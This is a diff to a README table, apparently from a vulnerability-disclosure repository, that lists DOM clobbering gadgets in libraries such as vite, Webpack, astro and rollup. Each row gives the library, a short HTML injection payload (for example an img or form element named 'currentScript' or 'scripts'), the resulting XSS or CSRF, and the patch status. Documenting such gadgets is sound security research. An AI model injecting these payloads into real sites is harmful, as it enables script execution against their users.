@@ -8,7 +8,7 @@ This repository lists client-side libraries that are vulnerable to HTML injectio
 |:-------:|:-----:|:-------:|----------|:------:|:--------:|:------:|:---:|
 | [vite](./domc-gadgets/vite.md) | 67.2K | v5.4.5 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
 | [Webpack](./domc-gadgets/webpack.md) | 64.4K | v5.93.0 | ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
-| [astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | Accepted | N/A |
+| [astro](./domc-gadgets/astro.md) | 45.7K | v4.5.9 | ```<form name="scripts">alert(1)</form><form name="scripts">alert(1)</form>``` | XSS | TheHulk | Accepted | CVE-2024-XXXXX |
 | [layui](./domc-gadgets/layui.md) | 29.5K | v2.9.16 | ```<img name="currentScript" src="https://xxx.xxx.xxx">``` | XSS | TheHulk | Patched | CVE-2024-XXXXX |
 | [rollup](./domc-gadgets/rollup.md) | 25.2K | v4.21.3 | ```<img src="https://xxx.xxx.xxx" name="currentScript">``` | XSS | TheHulk | Fixed | 2024-CVE-XXXXX |
 | [plausible-analytics](./domc-gadgets/plausible-analytics.md) | 19.7K | v2.1.0 | ```<img name="currentScript" data-domain="xxx.xxx.xxx" data-api="https://xxx.xxx.xxx">``` | CSRF | TheHulk | Reported | N/A |
